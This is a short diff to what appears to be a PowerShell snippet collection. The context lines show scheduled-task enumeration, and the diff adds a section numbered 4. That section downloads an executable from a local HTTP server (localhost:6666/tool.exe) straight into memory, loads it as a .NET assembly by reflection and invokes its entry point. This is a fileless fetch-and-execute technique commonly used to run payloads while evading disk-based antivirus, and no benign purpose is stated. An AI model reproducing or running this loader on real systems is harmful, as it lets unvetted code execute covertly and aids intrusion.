@@ -70,3 +70,22 @@ Get-ScheduledTask | ForEach-Object {
         }
     }
 }
+
+
+
+
+## 4
+$url = "http://localhost:6666/tool.exe"
+
+# Download the binary into memory
+$webClient = New-Object System.Net.WebClient
+$bytes = $webClient.DownloadData($url)
+
+# Load and execute the assembly from memory
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entryPoint = $assembly.EntryPoint
+
+if ($entryPoint) {
+    $params = if ($entryPoint.GetParameters().Count -eq 0) { $null } else { ,@("") }
+    $entryPoint.Invoke($null, $params)
+}
